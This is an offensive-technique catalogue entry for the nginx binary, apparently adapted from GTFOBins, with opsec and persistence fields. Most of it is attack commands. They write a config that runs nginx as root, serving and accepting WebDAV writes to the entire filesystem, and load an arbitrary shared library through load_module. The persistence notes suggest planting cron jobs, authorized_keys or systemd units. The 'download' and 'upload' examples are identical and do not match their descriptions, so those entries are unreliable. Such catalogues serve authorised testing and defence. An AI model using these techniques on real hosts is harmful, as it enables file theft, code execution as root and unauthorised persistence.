---
name: nginx
capabilities:
- exec
- upload
- download
required_permissions:
  level: user
difficulty: medium
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: true
examples:
- id: download
  description: Fetch a remote file to disk.
  capabilities:
  - download
  command: |-
    cat >/path/to/temp-file <<EOF
    user root;
    http {
      server {
        listen 80;
        root /;
        autoindex on;
        dav_methods PUT;
      }
    }
    events {}
    EOF

    nginx -c /path/to/temp-file
- id: library-load
  description: Load an arbitrary shared library.
  capabilities:
  - exec
  command: |-
    cat >/path/to/temp-file <<EOF
    load_module /path/to/lib.so
    EOF

    nginx -t -c /path/to/temp-file
  notes: Alternatively, the `ssl_engine` directive can be used.
- id: upload
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: |-
    cat >/path/to/temp-file <<EOF
    user root;
    http {
      server {
        listen 80;
        root /;
        autoindex on;
        dav_methods PUT;
      }
    }
    events {}
    EOF

    nginx -c /path/to/temp-file
references:
- https://gtfobins.github.io/gtfobins/nginx/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
